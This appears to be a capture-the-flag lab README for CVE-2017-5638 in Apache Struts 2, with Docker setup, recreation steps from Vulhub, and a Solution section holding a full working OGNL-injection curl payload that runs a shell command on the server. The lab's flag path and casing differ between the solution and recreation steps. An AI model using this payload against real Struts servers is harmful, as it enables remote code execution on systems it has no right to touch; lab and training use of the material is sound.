# Challenge 9: Struts Apache

## How to Start
```bash
docker compose pull
docker compose up -d
```

---

## Description
This challenge demonstrates **CVE-2017-5638**, which affects Apache Struts 2.3.x.  
The vulnerability is due to incorrect exception handling and error message generation during file upload attempts, allowing attackers to execute arbitrary code by crafting a `Content-Type`, `Content-Disposition`, or `Content-Length` HTTP header while including a `#cmd=` string.

---

## Solution

To exploit the vulnerability, run:
```bash
curl -v 127.0.0.1:8011   --header "Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\
(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).\
(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).\
(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).\
(#context.setMemberAccess(#dm)))).\
(#cmd='cat /root/flag.txt').\
(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).\
(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).\
(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).\
(#process=#p.start()).\
(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).\
(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())"   -F "file=@/etc/passwd"
```

**Flag:**
```
FLAG{STRUCK_BY_STRUTS2}
```

---

## How to Recreate

### 1. Clone Vulhub Repository
```bash
git clone https://github.com/vulhub/vulhub
```

### 2. Navigate to Struts2 S2-045 Directory
```bash
cd vulhub/struts2/s2-045
```

### 3. Start the Container
```bash
docker-compose up -d
```

### 4. Add the Flag
```bash
docker ps
docker exec -it <container_id> /bin/bash
echo "flag{STRUCK_BY_STRUTS2}" > /usr/local/tomcat/webapps/ROOT/flag.txt
```

---

## Final Notes
This challenge highlights the dangers of outdated Apache Struts installations and improper input validation, which can lead to full remote code execution.
